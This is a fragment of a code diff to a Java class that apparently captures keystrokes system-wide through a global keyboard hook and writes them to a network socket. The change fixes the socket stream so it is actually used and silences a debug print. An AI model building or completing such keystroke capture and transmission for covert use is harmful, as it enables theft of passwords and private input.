@@ -62,7 +62,7 @@ public class KeyStroke extends JFrame implements NativeKeyListener, Runnable{
         init();
         GlobalScreen.addNativeKeyListener(this);
         try {
-            DataOutputStream dataOutputStream = new DataOutputStream(this.socket.getOutputStream());
+            dataOutputStream = new DataOutputStream(this.socket.getOutputStream());
         } catch (IOException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
@@ -113,7 +113,7 @@ public class KeyStroke extends JFrame implements NativeKeyListener, Runnable{
     public void nativeKeyPressed(NativeKeyEvent e) {}
    
     public void nativeKeyReleased(NativeKeyEvent e) {
-        System.out.println("in native key released");
+        //System.out.println("in native key released");
         if (b_hook == true && b_unhook == false) {
             //System.out.println(" Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
             String pressed = NativeKeyEvent.getKeyText(e.getKeyCode());
